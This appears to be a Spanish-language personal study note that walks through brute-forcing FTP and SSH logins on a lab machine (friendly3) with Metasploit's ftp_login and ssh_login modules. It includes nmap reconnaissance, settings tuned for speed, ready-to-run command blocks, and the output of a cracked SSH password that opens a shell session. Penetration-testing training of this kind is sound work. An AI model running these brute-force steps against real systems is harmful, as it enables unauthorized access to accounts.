# Fuerza Bruta con Metasploit

> [!info] Idea principal
> Metasploit no solo sirve para lanzar exploits: sus modulos **auxiliary/scanner** permiten hacer fuerza bruta contra servicios de autenticacion (`ftp_login`, `ssh_login`, `smb_login`...). La ventaja frente a Hydra es que el resultado queda guardado en la base de datos y, en el caso de SSH, **abre una sesion automaticamente** al acertar.

> [!warning] Importante
> Todo esto se hace sobre la maquina de laboratorio **friendly3**. Usar estas tecnicas solo en entornos propios o con permiso.

## Metasploit vs Hydra

Ya habia atacado esta misma maquina con Hydra ([[4. Hydra - Ataque a Contraseñas]] y [[5. Hydra - Ataque a Usuarios]]). Metasploit hace lo mismo, pero cambia el enfoque:

| Aspecto | Hydra | Metasploit (`auxiliary/scanner`) |
|---|---|---|
| Velocidad | Mas rapido | Mas lento (por defecto `THREADS 1`) |
| Configuracion | Todo en una linea | Por opciones (`set`) |
| Resultado | Se imprime en pantalla | Se guarda en la base de datos |
| Tras acertar | Hay que conectarse a mano | `ssh_login` abre una **sesion** directamente |

> [!tip] Cuando usar cada uno
> Hydra para descubrir la credencial rapido. Metasploit cuando ya estoy dentro del framework y quiero encadenar el acceso con post-explotacion sin salir de la consola.

## Paso 1: Reconocimiento con Nmap

Con friendly3 ya en la red, lanzo un escaneo completo para ver que servicios puedo atacar.

```bash
nmap -p- -sS -sV -sC --min-rate 5000 -n -Pn 192.168.0.242
```

Resultado:

```text
Nmap scan report for 192.168.0.242
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:CE:44:A6 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!note] Que me interesa de aqui
> Dos servicios con autenticacion: **21/tcp (FTP)** y **22/tcp (SSH)**. Son los dos objetivos de la fuerza bruta. El `vsftpd 3.0.3` **no** es el vulnerable del backdoor (ese es el 2.3.4 de [[2. Uso basico de Metasploit - Explotacion vsftpd en Linux]]), asi que aqui toca adivinar credenciales.

### Recordatorio de flags de Nmap

- `-p-`: escanea los 65535 puertos.
- `-sS`: escaneo SYN (sigiloso).
- `-sV`: detecta version del servicio.
- `-sC`: lanza los scripts basicos de reconocimiento.
- `--min-rate 5000`: acelera el escaneo.
- `-n`: no resuelve DNS.
- `-Pn`: no hace ping previo (asume que el host esta vivo).

## Paso 2: Iniciar Metasploit

```bash
/usr/share/kali-menu/helper-scripts/metasploit-framework.sh
```

```text
[+] Starting database
[i] The database appears to be already configured, skipping initialization

       =[ metasploit v6.4.135-dev                               ]
+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
```

> [!tip] Por que este script y no `msfconsole` a secas
> Este helper de Kali arranca tambien la **base de datos** de PostgreSQL. Sin base de datos pierdo `creds`, `hosts` y `services`, que es justo lo que hace util la fuerza bruta desde Metasploit.

## Paso 3: Fuerza Bruta a FTP (`ftp_login`)

### Buscar y cargar el modulo

```text
msf > search ftp_login

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/ftp/ftp_login  .                normal  No     FTP Authentication Scanner

msf > use 0
msf auxiliary(scanner/ftp/ftp_login) >
```

> [!note] `use 0`
> Puedo cargar el modulo por su indice del ultimo `search` o por su ruta completa: `use auxiliary/scanner/ftp/ftp_login`.

### Opciones importantes

Con `show options` veo toda la configuracion. Las que de verdad importan:

| Opcion | Por defecto | Para que sirve |
|---|---|---|
| `RHOSTS` | — | Objetivo(s). Obligatoria. |
| `RPORT` | `21` | Puerto del servicio. |
| `USERNAME` | — | Un unico usuario conocido. |
| `USER_FILE` | — | Lista de usuarios (equivale a `-L` de Hydra). |
| `PASSWORD` | — | Una unica contraseña. |
| `PASS_FILE` | — | Diccionario de contraseñas (equivale a `-P`). |
| `USERPASS_FILE` | — | Pares `usuario contraseña` por linea. |
| `STOP_ON_SUCCESS` | `false` | Parar al encontrar credencial valida. |
| `THREADS` | `1` | Hilos concurrentes. Subirlo acelera mucho. |
| `BRUTEFORCE_SPEED` | `5` | Velocidad de 0 a 5 (5 = maxima). |
| `ANONYMOUS_LOGIN` | `false` | Probar login anonimo. |
| `USER_AS_PASS` | `false` | Probar el usuario como contraseña. |
| `BLANK_PASSWORDS` | `false` | Probar contraseñas vacias. |
| `VERBOSE` | `true` | Imprimir cada intento. |

### Configurar el ataque

Ya conozco el usuario `juan`, asi que solo tengo que adivinar la contraseña.

```text
msf auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/ftp/ftp_login) > set USERNAME juan
msf auxiliary(scanner/ftp/ftp_login) > set RHOST 192.168.0.242
msf auxiliary(scanner/ftp/ftp_login) > run
```

> [!note] `RHOST` vs `RHOSTS`
> La opcion se llama `RHOSTS` (en plural, admite rangos y ficheros), pero Metasploit acepta `set RHOST` como alias. Al hacer `show options` se ve que ha rellenado igualmente `RHOSTS`.

### Resultado

```text
[*] 192.168.0.242:21      - 192.168.0.242:21 - Starting FTP login sweep
[-] 192.168.0.242:21      - 192.168.0.242:21 - LOGIN FAILED: juan:123456 (Incorrect: )
[-] 192.168.0.242:21      - 192.168.0.242:21 - LOGIN FAILED: juan:12345 (Incorrect: )
[-] 192.168.0.242:21      - 192.168.0.242:21 - LOGIN FAILED: juan:123456789 (Incorrect: )
[-] 192.168.0.242:21      - 192.168.0.242:21 - LOGIN FAILED: juan:password (Incorrect: )
[-] 192.168.0.242:21      - 192.168.0.242:21 - LOGIN FAILED: juan:iloveyou (Incorrect: )
...
^C[*] 192.168.0.242:21      - Caught interrupt from the console...
[*] Auxiliary module execution completed
```

Va probando el `rockyou.txt` en orden hasta dar con la contraseña. Aqui lo corte con `Ctrl+C` porque con `THREADS 1` iba demasiado lento.

> [!warning] Es lento por defecto
> `THREADS 1` significa un intento cada vez. Con un diccionario de 14 millones de lineas como `rockyou.txt` no acaba nunca. Conviene lanzarlo asi:
> ```text
> set THREADS 10
> set STOP_ON_SUCCESS true
> set VERBOSE false
> ```
> `VERBOSE false` evita que se llene la pantalla con miles de `LOGIN FAILED` y hace el ataque notablemente mas rapido.

## Paso 4: Fuerza Bruta a SSH (`ssh_login`)

Mismo procedimiento contra el puerto 22.

### Buscar y cargar el modulo

```text
msf auxiliary(scanner/ftp/ftp_login) > search ssh_login

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login  .                normal  No     SSH Login Check Scanner

msf auxiliary(scanner/ftp/ftp_login) > use 0
msf auxiliary(scanner/ssh/ssh_login) >
```

### Diferencias con `ftp_login`

Las opciones son casi las mismas, pero este modulo añade tres cosas:

| Opcion | Por defecto | Para que sirve |
|---|---|---|
| `CreateSession` | `true` | **Abre una sesion** por cada login correcto. |
| `PRIVATE_KEY` / `KEY_PATH` | — | Autenticacion con clave privada en vez de contraseña. |
| `KEY_PASS` | — | Passphrase de la clave privada. |
| `VERBOSE` | `false` | Aqui viene desactivado (en `ftp_login` venia a `true`). |

> [!tip] La gran ventaja sobre Hydra
> `CreateSession true` es la razon de usar Metasploit aqui: al acertar la credencial no solo me la dice, sino que **me deja dentro de la maquina** con una sesion lista para post-explotacion.

### Configurar y lanzar

```text
msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.0.242
msf auxiliary(scanner/ssh/ssh_login) > set USERNAME juan
msf auxiliary(scanner/ssh/ssh_login) > run
```

### Resultado

```text
[*] 192.168.0.242:22      - Starting bruteforce
[*] 192.168.0.242:22 SSH - Testing User/Pass combinations
[+] 192.168.0.242:22      - Success: 'juan:alexis' 'uid=1001(juan) gid=1001(juan) groups=1001(juan)
    Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.0.8:34259 -> 192.168.0.242:22) at 2026-08-08 17:50:56 +0200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> [!success] Credencial encontrada
> Usuario: `juan` — Contraseña: `alexis` — Sesion SSH **1** abierta.

> [!note] Que me esta diciendo esa linea
> Al acertar, el modulo ejecuta `id` y `uname -a` en el objetivo. De ahi saco informacion gratis:
> - `uid=1001(juan)` → usuario **sin privilegios**, no es root. Tocara escalar privilegios.
> - `Linux friendly3 6.1.0-9-amd64 ... Debian` → sistema operativo y kernel para buscar vias de escalada.

## Paso 5: Usar la Sesion Obtenida

```text
msf auxiliary(scanner/ssh/ssh_login) > sessions
msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
```

Con `sessions` listo las sesiones abiertas y con `sessions -i 1` entro en la shell de la maquina. Para volver a la consola de Metasploit sin cerrar la sesion: `Ctrl+Z` (o `background`).

## Comandos Utiles

### Fuerza bruta a FTP

```text
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.0.242
set USERNAME juan
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set STOP_ON_SUCCESS true
run
```

### Fuerza bruta a SSH

```text
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.242
set USERNAME juan
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set STOP_ON_SUCCESS true
run
```

### Usuario desconocido (lista de usuarios)

```text
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
unset USERNAME
```

### Comprobaciones rapidas antes del diccionario

```text
set ANONYMOUS_LOGIN true
set USER_AS_PASS true
set BLANK_PASSWORDS true
```

### Ver lo guardado en la base de datos

```text
creds
hosts
services
```

## Flujo Resumido

> [!example] Pasos tipicos
> 1. Escanear la maquina con `nmap` e identificar servicios con autenticacion (21, 22, 445...).
> 2. Arrancar Metasploit con la base de datos activa.
> 3. `search <servicio>_login` y cargar el modulo auxiliar.
> 4. `show options` y configurar `RHOSTS`, usuario y diccionario.
> 5. Ajustar `THREADS`, `STOP_ON_SUCCESS` y `VERBOSE` para que no tarde una eternidad.
> 6. `run` y esperar el `[+] Success`.
> 7. Con SSH, entrar en la sesion abierta con `sessions -i <id>`.
> 8. Revisar `id` y `uname -a` para preparar la escalada de privilegios.

## Checklist Rapido

- [ ] Confirmar que tengo permiso para atacar la maquina.
- [ ] `nmap` previo para saber que servicios tienen login.
- [ ] Metasploit arrancado **con base de datos**.
- [ ] Modulo correcto cargado (`ftp_login`, `ssh_login`...).
- [ ] `RHOSTS` y `RPORT` bien puestos.
- [ ] Usuario (`USERNAME`) o lista (`USER_FILE`) definidos.
- [ ] Diccionario en `PASS_FILE`.
- [ ] `THREADS` subido y `STOP_ON_SUCCESS true`.
- [ ] Probar antes login anonimo / usuario como contraseña / contraseña vacia.
- [ ] Anotar la credencial y comprobarla en los demas servicios.
- [ ] Entrar en la sesion y revisar privilegios con `id`.
